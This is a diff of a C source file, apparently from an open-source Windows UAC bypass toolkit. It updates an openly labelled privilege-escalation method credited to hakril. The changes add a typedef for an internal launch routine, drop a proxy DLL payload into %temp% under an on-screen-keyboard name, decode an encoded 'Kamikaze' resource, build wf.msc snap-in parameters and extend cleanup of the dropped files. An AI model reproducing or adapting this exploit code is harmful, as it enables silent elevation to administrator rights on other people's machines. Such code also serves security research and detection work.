@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2020
+*  (C) COPYRIGHT AUTHORS, 2017 - 2022
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.23
+*  VERSION:     3.61
 *
-*  DATE:        18 Dec 2019
+*  DATE:        22 Jun 2022
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -18,6 +18,17 @@
 *******************************************************************************/
 #include "global.h"
 #include "encresource.h"
+
+typedef ULONG_PTR(WINAPI* pfnAipFindLaunchAdminProcess)(
+    LPWSTR lpApplicationName,
+    LPWSTR lpParameters,
+    DWORD UacRequestFlag,
+    DWORD dwCreationFlags,
+    LPWSTR lpCurrentDirectory,
+    HWND hWnd,
+    PVOID StartupInfo,
+    PVOID ProcessInfo,
+    ELEVATION_REASON* ElevationReason);
 
 /*
 * ucmHakrilMethod
@@ -80,12 +91,12 @@ NTSTATUS ucmHakrilMethod(
         }
 
         //
-        // Write Fubuki.exe to the %temp%
+        // Write Fubuki to the %temp%
         //
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx->szTempDirectory);
         Dummy = _strlen(szBuffer);
-        _strcat(szBuffer, FUBUKI_EXE);
+        _strcat(szBuffer, OSK_EXE);
 
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
             break;
@@ -117,7 +128,9 @@ NTSTATUS ucmHakrilMethod(
             (CONST PVOID)g_encodedKamikazeFinal,
             sizeof(g_encodedKamikazeFinal),
             'kmkz'))
+        {
             break;
+        }
 
         //
         // Build Kamikaze filename.
@@ -170,7 +183,7 @@ NTSTATUS ucmHakrilMethod(
         // Prepare snap-in parameters.
         //
 
-        _strcpy(szParams, TEXT("huy32,wf.msc \""));
+        _strcpy(szParams, TEXT("lzx32,wf.msc \""));
         _strcat(szParams, szBuffer);
         _strcat(szParams, TEXT("\""));
 
@@ -239,7 +252,13 @@ BOOL ucmHakrilMethodCleanup(
     _strcat(szBuffer, KAMIKAZE_MSC);
     DeleteFile(szBuffer);
 
+    Sleep(1000);
+
     szBuffer[Dummy] = 0;
-    _strcat(szBuffer, FUBUKI_EXE);
+    _strcat(szBuffer, KAMIKAZE_LAUNCHER);
+    DeleteFile(szBuffer);
+
+    szBuffer[Dummy] = 0;
+    _strcat(szBuffer, OSK_EXE);
     return DeleteFile(szBuffer);
 }
